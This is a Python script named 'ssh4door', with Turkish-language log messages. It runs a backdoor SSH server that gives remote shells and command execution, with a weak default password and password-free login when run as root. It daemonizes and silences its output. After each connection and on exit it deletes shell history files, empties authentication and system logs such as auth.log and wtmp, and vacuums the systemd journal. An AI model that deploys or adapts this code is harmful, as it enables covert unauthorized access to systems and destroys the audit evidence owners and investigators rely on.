#!/usr/bin/env python3
import os
import sys
import pty
import select
import socket
import signal
import subprocess
import threading
import atexit
import argparse
import paramiko

HOST = '0.0.0.0'
PORT = 999
PASSWORD = '12345'
KEY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'server.key')
PID_FILE = '/tmp/ssh4door.pid'
LOG_FILE = '/tmp/ssh4door.log'
BG_MODE = False
DEV_MODE = False

server_socket = None
host_key = None
running = True


def daemonize():
    pid = os.fork()
    if pid > 0:
        os._exit(0)

    os.setsid()
    os.umask(0)

    pid = os.fork()
    if pid > 0:
        os._exit(0)

    os.chdir('/')

    signal.signal(signal.SIGHUP, signal.SIG_IGN)

    sys.stdout.flush()
    sys.stderr.flush()

    si = open(os.devnull, 'r')
    if DEV_MODE:
        so = open(LOG_FILE, 'a+', buffering=1)
    else:
        so = open(os.devnull, 'w')

    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(so.fileno(), sys.stderr.fileno())

    with open(PID_FILE, 'w') as f:
        f.write(str(os.getpid()))


def cleanup():
    global server_socket
    if server_socket is not None:
        try:
            server_socket.close()
            print(f"[!] Port {PORT} kapatildi.", flush=True)
        except OSError:
            pass
        server_socket = None
    if BG_MODE and os.path.exists(PID_FILE):
        try:
            os.remove(PID_FILE)
        except OSError:
            pass


def signal_handler(sig, frame):
    global running
    running = False
    cleanup()
    stealth_cleanup()
    sys.exit(0)


def stealth_cleanup():
    if DEV_MODE:
        return
    try:
        home = os.path.expanduser('~')
        for hist_file in ['.bash_history', '.zsh_history', '.zhistory',
                          '.python_history', '.mysql_history', '.psql_history',
                          '.node_repl_history', '.sh_history']:
            path = os.path.join(home, hist_file)
            try:
                if os.path.exists(path):
                    os.remove(path)
            except OSError:
                pass
        try:
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
        except OSError:
            pass
        for syslog in ['/var/log/auth.log', '/var/log/secure',
                       '/var/log/messages', '/var/log/syslog',
                       '/var/log/wtmp', '/var/log/btmp',
                       '/var/log/lastlog', '/var/log/dmesg']:
            try:
                if os.path.exists(syslog):
                    open(syslog, 'w').close()
            except OSError:
                pass
        try:
            subprocess.run(['journalctl', '--rotate'],
                           capture_output=True, timeout=3)
            subprocess.run(['journalctl', '--vacuum-time=1s'],
                           capture_output=True, timeout=3)
        except Exception:
            pass
        try:
            subprocess.run(['bash', '-c', 'history -c; history -w'],
                           capture_output=True, timeout=3)
        except Exception:
            pass
    except Exception:
        pass


def get_host_key():
    if os.path.exists(KEY_FILE):
        key = paramiko.RSAKey(filename=KEY_FILE)
        print(f"[+] Host key yuklendi: {KEY_FILE}", flush=True)
        return key
    key = paramiko.RSAKey.generate(2048)
    key.write_private_key_file(KEY_FILE)
    print(f"[+] Yeni RSA host key olusturuldu: {KEY_FILE}", flush=True)
    return key


class SSHServer(paramiko.ServerInterface):
    def __init__(self):
        self.shell_event = threading.Event()
        self.exec_command = None
        self.exec_event = threading.Event()

    def check_auth_password(self, username, password):
        if os.geteuid() == 0:
            print(f"[+] ROOT -> {username} sifresiz kabul edildi", flush=True)
            return paramiko.AUTH_SUCCESSFUL
        if password == PASSWORD:
            print(f"[+] {username} basariyla giristi", flush=True)
            return paramiko.AUTH_SUCCESSFUL
        print(f"[-] {username} basarisiz giris (sifre: {password})", flush=True)
        return paramiko.AUTH_FAILED

    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return 'password'

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_pty_request(self, channel, term, width, height, pwidth, pheight, modes):
        return True

    def check_channel_shell_request(self, channel):
        self.shell_event.set()
        return True

    def check_channel_exec_request(self, channel, command):
        self.exec_command = command.decode() if isinstance(command, bytes) else command
        self.exec_event.set()
        return True


def handle_shell(channel):
    pid = None
    try:
        pid, fd = pty.fork()
        if pid == 0:
            shell = os.environ.get('SHELL', '/bin/bash')
            os.environ['TERM'] = 'xterm-256color'
            os.execve(shell, [f'-{os.path.basename(shell)}'], os.environ)
        else:
            try:
                channel.settimeout(0.0)
                while True:
                    r, _, _ = select.select([channel, fd], [], [])
                    for sock in r:
                        if sock == fd:
                            try:
                                data = os.read(fd, 1024)
                                if not data:
                                    raise EOFError()
                                channel.send(data)
                            except OSError:
                                raise EOFError()
                        if sock == channel:
                            data = channel.recv(1024)
                            if not data:
                                raise EOFError()
                            os.write(fd, data)
            except (EOFError, OSError):
                pass
    except Exception as e:
        print(f"[-] Shell hatasi: {e}", flush=True)
    finally:
        if pid is not None and pid > 0:
            try:
                os.close(fd)
                os.waitpid(pid, 0)
            except OSError:
                pass


def handle_client(client_socket, addr):
    transport = None
    try:
        transport = paramiko.Transport(client_socket)
        transport.add_server_key(host_key)

        server = SSHServer()
        transport.start_server(server=server)

        channel = transport.accept(30)
        if channel is None:
            print(f"[-] {addr[0]}:{addr[1]} -> kanal kabul edilemedi", flush=True)
            return

        if server.exec_event.wait(5):
            cmd = server.exec_command
            print(f"[+] {addr[0]}:{addr[1]} -> exec: {cmd}", flush=True)
            shell = os.environ.get('SHELL', '/bin/bash')
            proc = subprocess.Popen(
                [shell, '-c', cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            stdout, stderr = proc.communicate(timeout=30)
            if stdout:
                channel.sendall(stdout)
            if stderr:
                channel.sendall(stderr)
            channel.close()
            return

        if not server.shell_event.wait(30):
            print(f"[-] {addr[0]}:{addr[1]} -> shell istegi gelmedi", flush=True)
            channel.close()
            return

        print(f"[+] {addr[0]}:{addr[1]} -> shell baslatiliyor", flush=True)
        handle_shell(channel)

    except paramiko.SSHException:
        pass
    except EOFError:
        pass
    except Exception as e:
        print(f"[-] {addr[0]}:{addr[1]} -> hata: {e}", flush=True)
    finally:
        if transport:
            transport.close()
        try:
            client_socket.close()
        except OSError:
            pass
        print(f"[-] {addr[0]}:{addr[1]} -> baglanti kapandi", flush=True)
        stealth_cleanup()


def parse_args():
    global HOST, PORT, PASSWORD, KEY_FILE, PID_FILE, LOG_FILE, BG_MODE, DEV_MODE

    parser = argparse.ArgumentParser(
        description='ssh4door - Fake SSH server for remote access',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  sudo python3 ssh4door.py
  sudo python3 ssh4door.py --bg
  sudo python3 ssh4door.py --port 2222 --password sifre123
  sudo python3 ssh4door.py --bg --dev
  python3 ssh4door.py --port 2222
  ./kill.sh
  ./kill.sh /tmp/ssh4door.pid
        """
    )
    parser.add_argument('--bg', '-b', action='store_true',
                        help='Background modunda calistir')
    parser.add_argument('--port', '-p', type=int, default=PORT,
                        help=f'Dinlenecek port (varsayilan: {PORT})')
    parser.add_argument('--password', '-P', type=str, default=PASSWORD,
                        help=f'SSH sifresi (varsayilan: {PASSWORD})')
    parser.add_argument('--host', '-H', type=str, default=HOST,
                        help=f'Dinlenecek host (varsayilan: {HOST})')
    parser.add_argument('--pid-file', type=str, default=PID_FILE,
                        help=f'PID dosyasi yolu (varsayilan: {PID_FILE})')
    parser.add_argument('--dev', '-d', action='store_true',
                        help='Developer modu (loglari tut)')
    parser.add_argument('--log-file', type=str, default=LOG_FILE,
                        help=f'Log dosyasi yolu (varsayilan: {LOG_FILE})')

    args = parser.parse_args()

    HOST = args.host
    PORT = args.port
    PASSWORD = args.password
    PID_FILE = args.pid_file
    LOG_FILE = args.log_file
    BG_MODE = args.bg
    DEV_MODE = args.dev


def main():
    global host_key, server_socket, running

    parse_args()

    if BG_MODE:
        daemonize()

    if not DEV_MODE:
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')

    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    host_key = get_host_key()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.settimeout(1.0)

    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
    except OSError as e:
        print(f"[-] Port {PORT} kullanilamiyor: {e}", flush=True)
        cleanup()
        sys.exit(1)

    print(f"[+] ssh4door hazir | {HOST}:{PORT}", flush=True)
    if os.geteuid() == 0:
        print(f"[+] ROOT MOD: sifresiz giris aktif", flush=True)
    else:
        print(f"[+] KULLANICI MOD: sifre = {PASSWORD}", flush=True)
    print(f"[+] Baglan: ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p {PORT} kullanici@$(curl -s ifconfig.me 2>/dev/null || echo 'HOST_IP')", flush=True)

    if BG_MODE:
        print(f"[+] Background modda calisiyor (PID: {os.getpid()})", flush=True)
        print(f"[+] PID dosyasi: {PID_FILE}", flush=True)
        print(f"[+] Log dosyasi: {LOG_FILE}", flush=True)

    while running:
        try:
            client_socket, addr = server_socket.accept()
            print(f"[+] Baglanti: {addr[0]}:{addr[1]}", flush=True)
            t = threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True)
            t.start()
        except socket.timeout:
            continue
        except OSError:
            if running:
                print(f"[-] Baglanti kabul hatasi", flush=True)
            break

    cleanup()


if __name__ == '__main__':
    main()
